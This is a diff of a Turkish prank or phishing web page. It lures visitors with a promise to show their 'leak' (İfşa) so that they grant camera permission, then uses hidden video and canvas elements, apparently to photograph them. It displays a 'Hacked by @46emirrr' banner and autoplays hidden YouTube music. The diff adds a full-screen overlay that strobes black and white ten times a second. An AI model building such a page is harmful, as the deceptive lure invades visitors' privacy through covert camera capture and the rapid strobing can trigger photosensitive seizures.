@@ -2,33 +2,69 @@
 <html lang="tr">
 <head>
   <meta charset="UTF-8" />
-  <title>İzin Ver ve Fotoğraf Çek</title>
+  <title>Flash & Müzik & Kamera İzni</title>
   <style>
-    body { font-family: sans-serif; text-align: center; padding: 40px; }
-    video, canvas { display: none; }
-    button { padding: 10px 20px; font-size: 18px; cursor: pointer; }
-    #mesaj { margin-top: 20px; font-weight: bold; color: green; }
+    body, html {
+      margin: 0; padding: 0; height: 100%; overflow: hidden;
+      font-family: sans-serif; text-align: center; background: black;
+      color: white;
+      position: relative;
+    }
+    #flashOverlay {
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      pointer-events: none;
+      animation: flashColors 0.1s infinite alternate;
+      z-index: 9999;
+      mix-blend-mode: difference;
+    }
+    @keyframes flashColors {
+      0% { background-color: white; }
+      100% { background-color: black; }
+    }
+    #izinButton {
+      position: relative;
+      z-index: 10000;
+      margin-top: 40vh;
+      padding: 15px 30px;
+      font-size: 22px;
+      cursor: pointer;
+      background: #222;
+      color: white;
+      border: 2px solid white;
+      border-radius: 10px;
+      user-select: none;
+    }
+    #mesaj {
+      margin-top: 20px;
+      font-weight: bold;
+      font-size: 20px;
+      z-index: 10000;
+      position: relative;
+      color: lime;
+    }
     #hackedFlash {
-      font-size: 48px;
+      font-size: 60px;
       font-weight: bold;
       position: fixed;
       top: 50%;
       left: 50%;
       transform: translate(-50%, -50%);
-      animation: flashColors 1s infinite alternate;
-      z-index: 9999;
+      animation: flashColors 0.1s infinite alternate;
+      z-index: 11000;
       pointer-events: none;
       user-select: none;
     }
-    @keyframes flashColors {
-      0% { color: black; background-color: white; }
-      100% { color: white; background-color: black; }
+    video, canvas {
+      display: none;
     }
   </style>
 </head>
 <body>
 
-  <h2>📷 İfşanı görmek için lütfen izin ver</h2>
+  <div id="flashOverlay"></div>
+
+  <h2 style="position: relative; z-index: 10000;">📷 İfşanı görmek için lütfen izin ver</h2>
   <button id="izinButton">İfşanı görmek için izin ver</button>
 
   <video id="video" autoplay playsinline></video>
@@ -36,11 +72,11 @@
   <div id="mesaj"></div>
   <div id="hackedFlash" style="display:none;">Hacked by @46emirrr</div>
 
-  <!-- YouTube arka plan müziği (2:48'den başlar) -->
+  <!-- YouTube arka plan müziği (43. saniyeden başlar) -->
   <iframe
     width="0"
     height="0"
-    src="https://www.youtube.com/embed/w_S98XbQmPY?autoplay=1&loop=1&playlist=w_S98XbQmPY&controls=0&mute=0&start=168"
+    src="https://www.youtube.com/embed/w_S98XbQmPY?autoplay=1&loop=1&playlist=w_S98XbQmPY&controls=0&mute=0&start=43"
     frameborder="0"
     allow="autoplay"
     allowfullscreen
